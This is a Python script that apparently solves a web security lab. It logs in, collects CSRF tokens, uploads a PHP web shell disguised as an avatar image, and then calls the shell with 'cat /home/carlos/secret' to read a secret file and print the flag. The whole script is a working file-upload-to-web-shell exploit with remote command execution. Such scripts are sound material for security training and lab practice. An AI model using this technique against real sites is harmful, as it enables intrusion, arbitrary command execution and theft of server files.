from lib import (
    USERNAME,
    PASSWORD,
    WEBSHELL,
    LOGIN_CSRF_XPATH,
    MY_ACCOUNT_AVATAR_UPLOAD_CSRF,
    SESSION,
    generate_parser,
    get_flag,
    get_csrf_token,
)
import time


if __name__ == "__main__":
    start_time = time.perf_counter()

    args = generate_parser()

    lab_url = args.lab_url.strip("/")

    # Extracting the login form csrf token using xpath
    login_csrf_token = get_csrf_token(
        # Fetching the login page to get the login page csrf token and parsing it with lxml to generate a tree
        SESSION.get(url=f"{lab_url}/login").text,
        LOGIN_CSRF_XPATH,
    )
    print(f"[+] Login CSRF Token: {login_csrf_token}")

    # Extracting the avatar upload form csrf token
    my_account_avatar_upload_csrf = get_csrf_token(
        # Logging in as the given user and generating the tree for My Account page
        SESSION.post(
            url=f"{lab_url}/login",
            data={"username": USERNAME, "password": PASSWORD, "csrf": login_csrf_token},
        ).text,
        MY_ACCOUNT_AVATAR_UPLOAD_CSRF,
    )
    print(f"[+] My Account Avatar CSRF Token: {login_csrf_token}")

    # Uploading the payload
    avatar_file_upload_response = SESSION.post(
        url=f"{lab_url}/my-account/avatar",
        data={
            "user": USERNAME,
            "csrf": my_account_avatar_upload_csrf,
        },
        files={
            # File Tuple Syntax: (filename, file-content, content-type)
            "avatar": (
                "web-shell.php",
                WEBSHELL,
                "application/x-php",
            )
        },
    )

    if avatar_file_upload_response.ok:
        get_flag(
            SESSION.get(
                url=f"{lab_url}/files/avatars/web-shell.php?command=cat /home/carlos/secret"
            ).text
        )

    else:
        print("[-] Failed to Fetch Flag")

    end_time = time.perf_counter()
    print(f"[+] Total Time Taken: {end_time - start_time}")
